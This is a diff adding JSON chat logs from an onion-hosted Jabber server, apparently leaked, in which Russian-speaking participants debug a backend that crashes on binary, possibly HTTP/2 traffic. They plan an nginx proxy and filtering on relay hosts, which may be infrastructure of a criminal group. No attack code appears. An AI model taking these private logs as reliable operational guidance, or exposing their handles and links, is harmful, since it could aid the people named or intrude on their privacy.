+    },
+    "2021-08-27T12:57:49.427043": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сними соответствующие HTTP-запросы, поставь прокси перед сервером"
+    },
+    "2021-08-27T13:02:26.807514": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это самое начало"
+    },
+    "2021-08-27T13:02:41.482226": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот как идет поток .. вот так и логирует"
+    },
+    "2021-08-27T13:03:07.916738": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "тебе в текстовом виде ? так там миллион управляющих символов каких-то"
+    },
+    "2021-08-27T13:03:14.346463": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "где то в середине http/1.1"
+    },
+    "2021-08-27T13:03:17.207162": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "виднеется"
+    },
+    "2021-08-27T13:03:42.533109": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "можно файлом"
+    },
+    "2021-08-27T13:03:42.549902": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "можно файлом"
+    },
+    "2021-08-27T13:04:01.499518": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ты можешь локализовать сбойный байт?"
+    },
+    "2021-08-27T13:04:01.500649": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ты можешь локализовать сбойный байт?"
+    },
+    "2021-08-27T13:04:01.818485": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок щас сделаю"
+    },
+    "2021-08-27T13:04:07.445032": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "даже хотя бы в этом потоке"
+    },
+    "2021-08-27T13:04:07.445839": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "даже хотя бы в этом потоке"
+    },
+    "2021-08-27T13:04:18.856934": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "сказать - байт номер такой-то приводит к вылету"
+    },
+    "2021-08-27T13:04:18.858832": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "сказать - байт номер такой-то приводит к вылету"
+    },
+    "2021-08-27T13:05:55.254009": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "он говорит что метода нет в хттп"
+    },
+    "2021-08-27T13:06:01.243998": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "cowboy_protocol:parse_method(<<>>"
+    },
+    "2021-08-27T13:06:06.854604": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "пустой - поток обрывается"
+    },
+    "2021-08-27T13:08:00.856211": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "наверно пришло время обновить либу .. а то она уже далеко вперед ушла"
+    },
+    "2021-08-27T13:09:11.124479": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "либа 6 летней давности"
+    },
+    "2021-08-27T13:09:39.654606": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "протокол не сильно менялся за эти 6 лет"
+    },
+    "2021-08-27T13:09:39.656168": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "протокол не сильно менялся за эти 6 лет"
+    },
+    "2021-08-27T13:11:32.564031": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я бы сказал не менялся )"
+    },
+    "2021-08-27T13:12:55.662718": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "куда файл закинуть ?"
+    },
+    "2021-08-27T13:16:15.450574": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "https://disk.yandex.ru/d/zIsWj8NjR53tGg"
+    },
+    "2021-08-27T13:16:18.195383": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот 2 файла"
+    },
+    "2021-08-27T13:17:30.256973": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "flip и steller отправил приглашения"
+    },
+    "2021-08-27T13:18:23.925380": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "мне все равно пока ничего не ясно из файлов"
+    },
+    "2021-08-27T13:18:23.927316": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "мне все равно пока ничего не ясно из файлов"
+    },
+    "2021-08-27T13:18:59.117015": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать"
+    },
+    "2021-08-27T13:18:59.118802": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать"
+    },
+    "2021-08-27T13:21:57.110494": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это бинарный поток который мне приходит .."
+    },
+    "2021-08-27T13:22:00.248481": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот с первого байта"
+    },
+    "2021-08-27T13:22:25.681191": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "давайте поставлю nginx между клиентом и деро"
+    },
+    "2021-08-27T13:22:31.475796": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "поставь"
+    },
+    "2021-08-27T13:22:37.701730": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и там может по логам что поймем"
+    },
+    "2021-08-27T13:22:37.844133": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и пусть логирует все запросы .."
+    },
+    "2021-08-27T13:22:46.285486": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок сейчас"
+    },
+    "2021-08-27T13:22:53.640201": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "запрос . тело . ответ"
+    },
+    "2021-08-27T13:23:09.182801": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я сменю порт у деро, на 8082 будут нджинкс принимать"
+    },
+    "2021-08-27T13:24:01.560672": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а, драйвера не добавил сюда"
+    },
+    "2021-08-27T13:24:08.082850": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нужен он?"
+    },
+    "2021-08-27T13:24:55.920814": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз"
+    },
+    "2021-08-27T13:25:13.262560": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот кто это генерит - тот и нужен .."
+    },
+    "2021-08-27T13:28:48.359545": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "нам нужен прилетевший сырой HTTP-запрос как есть"
+    },
+    "2021-08-27T13:28:48.360902": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нам нужен прилетевший сырой HTTP-запрос как есть"
+    },
+    "2021-08-27T13:28:57.835750": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и нужно указание - что в нем криво"
+    },
+    "2021-08-27T13:28:57.836329": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и нужно указание - что в нем криво"
+    },
+    "2021-08-27T13:34:50.150693": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "[16:24:01] <defender> а, драйвера не добавил сюда\nобязательно нужен"
+    },
+    "2021-08-27T13:34:50.151702": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[16:24:01] <defender> а, драйвера не добавил сюда\nобязательно нужен"
+    },
+    "2021-08-27T13:39:46.752366": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "> нам нужен прилетевший сырой HTTP-запрос как есть\nя уже показал что мне прилетает .. вот это сырые данные"
+    },
+    "2021-08-27T13:40:50.328851": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "подождем что дефендер скажет"
+    },
+    "2021-08-27T13:40:50.330919": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "подождем что дефендер скажет"
+    },
+    "2021-08-27T13:42:25.142860": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "мне все равно пока ничего не ясно из файлов"
+    },
+    "2021-08-27T13:42:25.143568": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать"
+    },
+    "2021-08-27T13:42:25.144621": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот с первого байта"
+    },
+    "2021-08-27T13:42:25.145164": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "давайте поставлю nginx между клиентом и деро"
+    },
+    "2021-08-27T13:42:25.145420": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "это бинарный поток который мне приходит .."
+    },
+    "2021-08-27T13:42:25.145817": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "поставь"
+    },
+    "2021-08-27T13:42:25.146216": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и там может по логам что поймем"
+    },
+    "2021-08-27T13:42:25.146486": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и пусть логирует все запросы .."
+    },
+    "2021-08-27T13:42:25.146877": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ок сейчас"
+    },
+    "2021-08-27T13:42:25.147896": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я сменю порт у деро, на 8082 будут нджинкс принимать"
+    },
+    "2021-08-27T13:42:25.148161": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "запрос . тело . ответ"
+    },
+    "2021-08-27T13:42:25.148552": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а, драйвера не добавил сюда"
+    },
+    "2021-08-27T13:42:25.148896": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нужен он?"
+    },
+    "2021-08-27T13:42:25.149557": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз"
+    },
+    "2021-08-27T13:42:25.150109": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот кто это генерит - тот и нужен .."
+    },
+    "2021-08-27T13:42:25.150642": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нам нужен прилетевший сырой HTTP-запрос как есть"
+    },
+    "2021-08-27T13:42:25.151376": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и нужно указание - что в нем криво"
+    },
+    "2021-08-27T13:42:25.151987": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "[16:24:01] <defender> а, драйвера не добавил сюда\nобязательно нужен"
+    },
+    "2021-08-27T13:42:25.152713": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "> нам нужен прилетевший сырой HTTP-запрос как есть\nя уже показал что мне прилетает .. вот это сырые данные"
+    },
+    "2021-08-27T13:42:25.153554": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "подождем что дефендер скажет"
+    },
+    "2021-08-27T13:49:10.567965": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "дело в том, что данные в dero посылает не один модуль"
+    },
+    "2021-08-27T13:49:18.701914": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "их много"
+    },
+    "2021-08-27T13:49:49.130176": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "мы тут с зуласом разбираемся, там странно всё"
+    },
+    "2021-08-27T13:49:49.134506": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "мы тут с зуласом разбираемся, там странно всё"
+    },
+    "2021-08-27T13:50:18.926960": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало"
+    },
+    "2021-08-27T13:53:32.721143": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и расчитывать на то, что данные будут невалидные"
+    },
+    "2021-08-27T13:54:01.214288": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "их могут специально посылать"
+    },
+    "2021-08-27T13:56:32.227514": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и расчитывать на то, что данные будут невалидные"
+    },
+    "2021-08-27T13:56:32.228063": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "их могут специально посылать"
+    },
+    "2021-08-27T13:58:05.088984": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю"
+    },
+    "2021-08-27T13:58:24.127639": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками"
+    },
+    "2021-08-27T13:58:24.130705": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками"
+    },
+    "2021-08-27T13:58:26.260873": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "точнее без них"
+    },
+    "2021-08-27T13:58:26.263766": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "точнее без них"
+    },
+    "2021-08-27T13:58:29.816978": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "а там бинарный поток"
+    },
+    "2021-08-27T13:58:29.818089": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "а там бинарный поток"
+    },
+    "2021-08-27T13:58:48.995649": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2"
+    },
+    "2021-08-27T13:58:48.997198": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2"
+    },
+    "2021-08-27T13:59:02.540606": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и тогда возникает вопрос\n- откуда у нас вообще HTTP/2?"
+    },
+    "2021-08-27T13:59:02.542109": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и тогда возникает вопрос\n- откуда у нас вообще HTTP/2?"
+    },
+    "2021-08-27T13:59:21.601259": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ну или QUIC или еще какая бинарная гугловская фигня"
+    },
+    "2021-08-27T13:59:21.603372": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну или QUIC или еще какая бинарная гугловская фигня"
+    },
+    "2021-08-27T13:59:40.079016": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender: на прокладках случайно не включена конверсия в HTTP/2 ?"
+    },
+    "2021-08-27T13:59:40.080471": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: на прокладках случайно не включена конверсия в HTTP/2 ?"
+    },
+    "2021-08-27T14:04:43.780200": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нет"
+    },
+    "2021-08-27T14:04:57.491155": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "прокладки - роутеры, что приняли то и передали"
+    },
+    "2021-08-27T14:07:15.101595": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "отлучился"
+    },
+    "2021-08-27T14:09:00.005426": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа"
+    },
+    "2021-08-27T14:09:00.007195": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа"
+    },
+    "2021-08-27T14:09:10.157884": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "если подтвердится что там не HTTP/1.1 то это очень интересно"
+    },
+    "2021-08-27T14:09:10.160638": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "если подтвердится что там не HTTP/1.1 то это очень интересно"
+    },
+    "2021-08-27T14:09:16.331347": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "нужно подтверждение от тебя"
+    },
+    "2021-08-27T14:09:16.334894": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "нужно подтверждение от тебя"
+    },
+    "2021-08-27T14:14:50.297238": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "я делаю нджинкс"
+    },
+    "2021-08-27T14:15:45.062442": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "кстати zulas: ты можешь \"хороший\" запрос проследить до базы?"
+    },
+    "2021-08-27T14:15:45.066224": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "кстати zulas: ты можешь \"хороший\" запрос проследить до базы?"
+    },
+    "2021-08-27T14:15:51.253427": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "вот тот бинарный"
+    },
+    "2021-08-27T14:15:51.256444": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот тот бинарный"
+    },
+    "2021-08-27T14:53:54.442245": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "что значит послать до базы ?"
+    },
+    "2021-08-27T14:53:58.874059": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "@buza"
+    },
+    "2021-08-27T14:54:32.238554": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "не послать, а проследить"
+    },
+    "2021-08-27T14:54:32.239541": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "не послать, а проследить"
+    },
+    "2021-08-27T14:54:40.782741": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "вот тебе пришел этот бинарный запрос"
+    },
+    "2021-08-27T14:54:40.785315": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "вот тебе пришел этот бинарный запрос"
+    },
+    "2021-08-27T14:54:51.035479": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и ты говоришь что первый из них нормально парсится и отрабатывает"
+    },
+    "2021-08-27T14:54:51.038342": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и ты говоришь что первый из них нормально парсится и отрабатывает"
+    },
+    "2021-08-27T14:55:04.009291": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "раз так, он должен положить в базу данных новую запись"
+    },
+    "2021-08-27T14:55:04.011151": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "раз так, он должен положить в базу данных новую запись"
+    },
+    "2021-08-27T14:55:10.352481": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "эту запись можно увидеть?"
+    },
+    "2021-08-27T14:55:10.355612": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "эту запись можно увидеть?"
+    },
+    "2021-08-27T14:55:14.255960": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "там больше нет ничего .."
+    },
+    "2021-08-27T14:55:22.134185": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну т.е. до базы оно не доходит"
+    },
+    "2021-08-27T14:55:28.794895": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ни первый ни второй?"
+    },
+    "2021-08-27T14:55:28.799081": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ни первый ни второй?"
+    },
+    "2021-08-27T14:55:31.162587": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "просто в логи ничего не пишется"
+    },
+    "2021-08-27T14:55:37.827956": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "да"
+    },
+    "2021-08-27T14:55:50.741679": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "ну так может это и не мы?"
+    },
+    "2021-08-27T14:55:50.743607": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "ну так может это и не мы?"
+    },
+    "2021-08-27T14:55:50.934690": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "может это боты поисковые и т.п ?"
+    },
+    "2021-08-27T14:56:35.196483": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?"
+    },
+    "2021-08-27T14:56:35.199054": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?"
+    },
+    "2021-08-27T14:56:48.976996": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "все HTTP/2 QUIC и прочий модный кал"
+    },
+    "2021-08-27T14:56:48.981091": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "все HTTP/2 QUIC и прочий модный кал"
+    },
+    "2021-08-27T14:57:01.397045": {
+        "src": "buza@q3mcco35auwcstmt.onion",
+        "dst": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "body": "и запретить доступ к веб-серверу не с прокладки"
+    },
+    "2021-08-27T14:57:01.400904": {
+        "src": "ttrr@conference.q3mcco35auwcstmt.onion",
+        "dst": "buza@q3mcco35auwcstmt.onion",
+        "body": "и запретить доступ к веб-серверу не с прокладки"
+    },
+    "2021-08-30T07:55:38.729307": {
